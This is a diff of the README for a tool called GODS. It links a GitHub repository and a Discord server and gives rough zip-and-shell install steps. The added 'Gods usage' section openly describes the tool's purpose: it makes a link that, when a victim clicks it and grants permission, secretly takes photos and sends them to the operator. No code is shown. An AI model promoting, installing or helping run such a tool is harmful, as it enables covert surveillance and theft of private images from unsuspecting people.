@@ -6,7 +6,7 @@ GitHub repo:
 
 https://github.com/Xxwill0wprismatic/GODS
 
-#HOW TO INSTALL GODS
+# HOW TO INSTALL GODS
 
 either download the raw zip file without extracting it move it to a shell or a CLI and extract it there or download the zip file directly from a shell and use it.
 
@@ -22,6 +22,10 @@ ask any questions or report bugs and issues and recommend new features at discor
 
 Discord server:
 https://discord.gg/EdhvDhxFJ
+
+# Gods usage
+
+Gods is used to steal the photos of others by creating a link and if someone clicks the link from the remote host and allows permission it takes a couple of photos and send it to you this isn't that powerful btw
 
 
 # IMPORTANT DISCLAIMER
